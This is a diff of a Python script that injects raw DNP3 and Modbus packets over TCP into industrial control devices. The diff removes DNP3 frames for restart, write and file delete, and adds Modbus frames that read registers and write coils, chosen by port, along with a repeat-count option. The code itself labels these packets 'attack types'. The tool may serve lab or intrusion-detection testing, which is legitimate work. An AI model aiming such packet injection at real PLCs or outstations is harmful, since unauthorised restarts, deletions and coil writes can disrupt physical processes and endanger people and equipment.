@@ -3,27 +3,12 @@
 import getopt,sys,optparse
 from socket import *
 from binascii import hexlify, unhexlify
+import time
 
 DEBUG = 1
 
-dnp3_HealthCheck="\x05\x64\x05\xc0\x01\x00\x00\x04\xe9\x21" 
-dnp3_HealthCheck="056405c001000004e921"
-dnp3_WarmRestart="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0e\x6c\xd1" 
-dnp3_WarmRestart="056408c401000200390ddece0e6cd1" 
-dnp3_ColdRestart="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0d\x8E\x8B" 
-dnp3_ColdRestart="056408c401000200390ddece0d8E8B" 
-dnp3_Write="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x02\x9d\xf7" 
-dnp3_Write="056408c401000200390ddece029df7" 
-dnp3_InitData="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0f\x32\xe7" 
-dnp3_InitData="056408c401000200390ddece0f32e7" 
-dnp3_AppTermination="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x12\xf6\x45" 
-dnp3_AppTermination="056408c401000200390ddece12f645" 
-dnp3_DeleteFile="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x1b\x21\x8c" 
-dnp3_DeleteFile="056408c401000200390ddece1b218c" 
-dnp3_ReadRequest="056405c903000400bd71"
-
 dnp3_list=[
-           "056405c001000004e921",  #dnp3_HealthCheck:056405c903000400bd71
+           "056405c001000004e921",  #dnp3_HealthCheck
            "056408c40a000100fc42c0c00e7edc", #dnp3_WarmRestart
            "056408c40a000100fc42c0c00d9c86", #dnp3_ColdRestart
            "056412c403000400152dc1c10232010701fa7d0b460d01c863", #dnp3_Write
@@ -33,11 +18,22 @@ dnp3_list=[
            "056405c903000400bd71"            #dnp3_ReadRequest
     ]
 
-HOST = "127.0.0.1"
-BUFSIZ = 1024
-DNP3_type = 8  #default to Request Link Status, if not specify DNP3 packet attack type [1..8]
-PORT = 502
 
+modbus_list=[
+           "0001000000060a0100000001",  #read coils
+           "0001000000060a0300050002",  #read holding reg
+           "0001000000060a0500020000", #write signle coil
+           "000100000006ff020063001e", #Read discrete Inputs
+           "297500000006ff0400300028", #read input registers
+           "485a00000008ff0f000700030100", #write multiple coils
+           "0001000000060a0100000001",  #read coils
+    ]
+
+
+
+HOST = "127.0.0.1"
+PORT = 502
+BUFSIZ = 1024
 
 
 def usage():
@@ -46,7 +42,9 @@ def usage():
     -h / --help :help
     -i / --ip :ip address
     -p / --prot :destination port
-    -t / --type: DNP3 PDU tye
+    -t / --type: MODBUS PDU tye
+    -c / --count: how many packets to send in a session 
+                  if count > 1, -t / --type would be invalid
 
     """)
     print_attack_type()
@@ -54,16 +52,9 @@ def usage():
 
 def print_attack_type():
     print(u"""
-Defined DNP3 attack type:
-'1: Health check'
-'2: Warm Restart'
-'3: Cold Restart'
-'3: Cold Restart'
-'4: Write'
-'5: Initialize data'
-'6: App function termination'
-'7: Delete file'
-'8: Request Link'
+Defined MODBUS attack type:
+'1: Read Decrete Inputs'
+'2: Read Input Registers
     """)
 
 
@@ -72,29 +63,30 @@ def debug(msg):
         print ("debug: %s" % msg)
 
 
-def send_dnp3_packet(socket, dnp3_type = 8):
-    global  HOST,BUFSIZ,DNP3_type,PORT
+def send_pdu_packet(socket, send_list, attack_type = 0, tm = 10):
+    global  HOST,BUFSIZ,PORT
  
-    dnp3_pdu = dnp3_list[int(dnp3_type) - 1]
-    print  ("Sending DNP3 packet to target %s: %s"%(HOST, dnp3_pdu))
-    socket.sendall(unhexlify(dnp3_pdu))
+    print  ("Sending MODBUS packet %s to target %s: %s"%(attack_type, HOST, send_list[(attack_type) -1]))
+    socket.sendall(unhexlify(send_list[(attack_type) -1]))
 
     #get response
-    #if (8 == int(dnp3_type)):
     resp = socket.recv(BUFSIZ)
-    print("Received DNP3 Response from %s: %s" % (HOST, resp.encode('hex')))
- 
+    print("Received MODBUS Response from %s: %s" % (HOST, resp.encode('hex')))
 
+    #time.sleep(tm)
+    #str1 = raw_input('any key to continue> ')
+ 
 def debug(msg):
     if DEBUG == 1:
         print ("debug: %s" % msg)
 
 def main(argv):
-
-    global  HOST,BUFSIZ,DNP3_type,PORT
+    global  HOST,BUFSIZ,PORT,modbus_list,dnp3_list
+    attack = 1 #packet type
+    COUNT=1    #iteration count
 
     try:
-        opts,args = getopt.getopt(sys.argv[1:],"hp:i:t:",["help","ip=","port=","type="])
+        opts,args = getopt.getopt(sys.argv[1:],"hp:c:i:t:",["help","ip=","port=","type=","count="])
 
     except getopt.GetoptError:
         usage()
@@ -110,22 +102,27 @@ def main(argv):
           elif opt in ("-p", "--port"):
              PORT= arg
              print  ("Destination PORT: %s"% PORT)
+          elif opt in ("-c", "--count"):
+             COUNT= int(arg)
           elif opt in ("-t", "--type"):
              try:
-                 DNP3_type= int(arg)
+                 attack= int(arg)
              except: 
-                 print ("DNP3 type %s is NOT recogizable!" % arg)
+                 print ("Attack type %s is NOT recogizable!" % arg)
                  sys.exit(1)
-             if (DNP3_type > len(dnp3_list)):
-                     print ("DNP3 type %s is out of range [1-%s]!" % (arg, len(dnp3_list)))
-                     sys.exit(1)
-          else:
-             usage()
-             sys.exit(1)
-            
-                
+
+    if (PORT == "502"):
+        tranx_list = modbus_list
+    if (PORT == "20000"):
+        tranx_list = dnp3_list
+
+    if ( (attack > len(tranx_list)) or (attack <= 0) ):
+        print ("Attack type %s is out of range [1-%s]!" % (arg, len(tranx_list)))
+        sys.exit(1)
+           
+    print  ("Attack injected type: %s"% attack)
+    print  ("Packet number: %s"% COUNT)
     try:
-        print  ("DNP3 injected type: %s"% DNP3_type)
         tcpCliSock = socket(AF_INET, SOCK_STREAM)
     except error, e:
         print  ("create socket failed %s" % e)
@@ -138,9 +135,24 @@ def main(argv):
     except error, e:
         print  ("Connect to target %s: %s error: %s" % (HOST, PORT, e))
  
-    send_dnp3_packet(tcpCliSock, DNP3_type)
-
-    str1 = raw_input('> ')
+    if ( COUNT == 1 ):
+        send_pdu_packet(tcpCliSock, tranx_list, attack)
+    elif ( COUNT <= 0 ):
+        print  ("count %s invalid, should be >=1" % e)
+        sys.exit(1)
+    else:
+        print ("PDU list length: %s" % len(tranx_list))
+        cnt=0
+        while (cnt < COUNT):
+            for idx in range (1, (len(tranx_list)) ):
+                print ("list idx: %s" % (idx -1))
+                send_pdu_packet(tcpCliSock, tranx_list, idx)
+                cnt += 1
+                print ("iteration cnt: %s" % (cnt))
+                if (cnt >= COUNT):
+                    break
+                
+    str1 = raw_input('any key to continue> ')
     tcpCliSock.close()
 
 if __name__ == "__main__":
